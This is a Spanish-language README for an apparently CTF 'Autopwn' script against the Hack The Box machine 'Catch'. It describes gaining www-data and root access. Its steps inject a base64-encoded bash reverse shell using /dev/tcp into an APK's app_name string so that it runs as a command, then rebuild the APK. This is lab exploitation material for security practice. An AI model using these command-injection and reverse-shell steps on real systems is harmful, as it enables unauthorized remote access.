# Autopwn

### (www-data)
Al seleccionar la opcion 1 al ejecutar el script te dara acceso solo como usuario www-data en el sistema y te mostrara ya la contraseña ssh para el 
usiario will 

### (root)
Y al seleccionar la opcion 2 te dara acesso a el sistema como usuario root pero para eso ya tendras que tener listo el archivo apk con el payload 
preparado, de igual manera aqui te explico como hacerlo: 

1. Tendra que ya disponer de la herramienta **apk-tool.jar** y el apk de la maquina **catchv1.0.apk**, ya que tenga esos archivos ejecute los 
siguientes comandos:
 ```console
java -jar apktool_2.6.1.jar d catchv1.0.apk
nano catchv1.0/res/values/strings.xml
```
2. Busca la linea **< string name="app_name" >Catch</ string >** y agregar una reverse shell despues de Catch quedando asi 
**< string name="app_name" >Catch; echo** << Reverse Shell en base64 >> **| base64 -d | bash -i</ string >**

**Reverse shell en base64**
```console
echo '/bin/bash -l > /dev/tcp/<< your HTB ip address >>/8081 0<&1 2>&1' | base64 
```
3. Y ya despues compilamos otra ves el apk
```console
java -jar apktool_2.6.1.jar b catchv1.0/ -o out.apk
```

Ya con este archivo apk ahora si ejecute el archivo de python solo modifique las partes indicadas por los comentarios antes de usarlo
